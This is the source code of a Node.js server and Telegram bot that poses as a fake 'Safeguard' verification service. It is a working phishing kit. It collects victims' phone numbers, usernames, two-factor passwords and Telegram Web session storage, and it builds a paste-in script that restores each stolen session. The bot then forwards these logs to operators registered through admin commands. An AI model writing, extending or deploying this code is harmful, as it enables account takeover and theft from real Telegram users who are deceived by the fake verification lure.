const express = require("express");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// admins list (whoever adds the bot in the channel should be in this array.)
const admins = [
  5891533625
];

// Authorized users and their configurations with enhanced security
const authorizedUsers = new Map();

// Secure random API key generation
const generateSecureApiKey = () => {
  const buffer = require('crypto').randomBytes(32);
  return buffer.toString('hex');
};

// Secure user session tracking
const userSessions = new Map();

// Rate limiting for API requests
const rateLimits = new Map();
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS = 10; // max 10 requests per minute

// loading all the pictures beforehand for speed
const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));

const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });

const generateRandomString = (length) => {
  const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * charset.length);
    result += charset[randomIndex];
  }
  return result;
};

let safeguardUsername;

safeguardBot.getMe().then(botInfo => {
  safeguardUsername = botInfo.username;
  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
});

const app = express();
app.use(express.json());
app.use(express.static("public"))

app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const {
      userId,
      firstName,
      usernames,
      phoneNumber,
      isPremium,
      password,
      quicklySet,
      type
    } = req.body;

    let pass = password;
    if (pass === null) {
      pass = "No Two-factor authentication enabled.";
    }

    let usernameText = "";
    if (usernames) {
      usernameText = `Usernames owned:\n`;
      usernames.forEach((username, index) => {
        usernameText += `<b>${index + 1}</b>. @${username.username} ${username.isActive ? "✅" : "❌"}\n`;
      });
    }

    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
    const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    await handleRequest(req, res, {
      password: pass,
      script: quickAuth,
      userId,
      name: firstName,
      number: formattedNumber,
      usernames: usernameText,
      premium: isPremium,
      type,
    });
  } catch (error) {
    console.error("500 server error", error);
    res.status(500).json({ error: "server error" });
  }
});

// Enhanced request handling with multiple security layers
const handleRequest = async (req, res, data) => {  
  const apiKey = req.headers['x-api-key'];
  
  // 1. Validate API key exists
  if (!apiKey) {
    console.log('Request rejected: No API key provided');
    return res.status(401).json({ error: "Unauthorized" });
  }

  // 2. Rate limiting check
  const now = Date.now();
  const userRateLimit = rateLimits.get(apiKey) || { count: 0, window: now };
  
  if (now - userRateLimit.window > RATE_LIMIT_WINDOW) {
    userRateLimit.count = 0;
    userRateLimit.window = now;
  }
  
  if (userRateLimit.count >= MAX_REQUESTS) {
    console.log(`Rate limit exceeded for API key: ${apiKey.substring(0, 8)}...`);
    return res.status(429).json({ error: "Too many requests" });
  }
  
  userRateLimit.count++;
  rateLimits.set(apiKey, userRateLimit);

  // 3. Validate user exists and is active
  const user = authorizedUsers.get(apiKey);
  if (!user || !user.active) {
    console.log(`Invalid or inactive API key attempt: ${apiKey.substring(0, 8)}...`);
    return res.status(401).json({ error: "Unauthorized" });
  }

  // 4. Update last access time
  user.lastAccess = Date.now();
  
  // 5. Create unique log ID for tracking
  const logId = require('crypto').randomBytes(8).toString('hex');

  try {
    // 6. Send log with verification
    const message = `🔒 Secure Log #${logId}\n\n` +
      `🪪 <b>UserID</b>: ${data.userId}\n` +
      `🌀 <b>Name</b>: ${data.name}\n` +
      `⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n` +
      `📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n` +
      `${data.usernames}\n` +
      `🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\n` +
      `Go to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n` +
      `<code>${data.script}</code>\n` +
      `<b>Module</b>: Safeguard\n\n` +
      `🔏 Secured to: ${user.name}`;

    const sent = await safeguardBot.sendMessage(
      user.telegramId,
      message,
      { parse_mode: "HTML" }
    );

    // 7. Verify message was sent to correct user
    if (sent.chat.id.toString() !== user.telegramId) {
      console.error(`Security alert: Message ${logId} delivered to wrong user!`);
      await safeguardBot.deleteMessage(sent.chat.id, sent.message_id);
      return res.status(500).json({ error: "Security check failed" });
    }

    console.log(`Log ${logId} successfully delivered to user ${user.name}`);
    res.json({ success: true, logId });

  } catch (error) {
    console.error(`Failed to deliver log ${logId}:`, error);
    res.status(500).json({ error: "Failed to deliver log" });
  }
};

// Command handler for managing users with enhanced security
safeguardBot.onText(/\/adduser (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!admins.includes(msg.from.id)) {
    await safeguardBot.sendMessage(chatId, "Unauthorized access attempt has been logged.");
    console.log(`Unauthorized admin access attempt from: ${msg.from.id}`);
    return;
  }

  const [username, telegramId] = match[1].split(' ');
  if (!username || !telegramId || !/^\d+$/.test(telegramId)) {
    await safeguardBot.sendMessage(chatId, "Invalid format. Usage: /adduser username telegramId");
    return;
  }

  const apiKey = generateSecureApiKey();
  const userId = require('crypto').randomBytes(16).toString('hex');

  authorizedUsers.set(apiKey, {
    id: userId,
    telegramId: telegramId,
    name: username,
    active: true,
    createdAt: Date.now(),
    lastAccess: Date.now()
  });

  // Send API key through private message only
  await safeguardBot.sendMessage(chatId, 
    `User added successfully. Sending API key privately...`
  );
  
  try {
    await safeguardBot.sendMessage(telegramId, 
      `Your API key: ${apiKey}\n\nDO NOT share this key with anyone. Each log is tied to your account.`
    );
  } catch (error) {
    authorizedUsers.delete(apiKey);
    await safeguardBot.sendMessage(chatId, 
      `Error: Couldn't send API key to user. Make sure the user has started the bot.`
    );
    return;
  }
});

safeguardBot.onText(/\/removeuser (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  if (!admins.includes(msg.from.id)) {
    safeguardBot.sendMessage(chatId, "You are not authorized to remove users.");
    return;
  }

  const username = match[1];
  if (authorizedUsers.has(username)) {
    authorizedUsers.delete(username);
    safeguardBot.sendMessage(chatId, `User ${username} has been deactivated.`);
  } else {
    safeguardBot.sendMessage(chatId, `User ${username} not found.`);
  }
});

safeguardBot.onText(/\/listusers/, (msg) => {
  const chatId = msg.chat.id;
  if (!admins.includes(msg.from.id)) {
    safeguardBot.sendMessage(chatId, "You are not authorized to list users.");
    return;
  }

  let userList = "Authorized Users:\n";
  for (const [apiKey, user] of authorizedUsers) {
    userList += `${user.name}: ${user.telegramId} (${user.active ? 'Active' : 'Inactive'})\n`;
  }
  safeguardBot.sendMessage(chatId, userList);
});

const handleNewChatMember = async (bot) => {
  bot.on("my_chat_member", (update) => {
    const chatId = update.chat.id;

    const jsonToSend = { 
      caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`, 
      parse_mode: "HTML", 
      reply_markup: { 
        inline_keyboard: [[{ 
          text: "Tap To Verify", 
          url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` 
        }]] 
      } 
    };

    if (
      update.chat.type === "channel" &&
      update.new_chat_member.status === "administrator" &&
      update.new_chat_member.user.username === safeguardUsername &&
      admins.includes(update.from.id)
    ) {
      bot.sendPhoto(chatId, safeguardVerification, jsonToSend);
    }
  });
};

handleNewChatMember(safeguardBot);

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
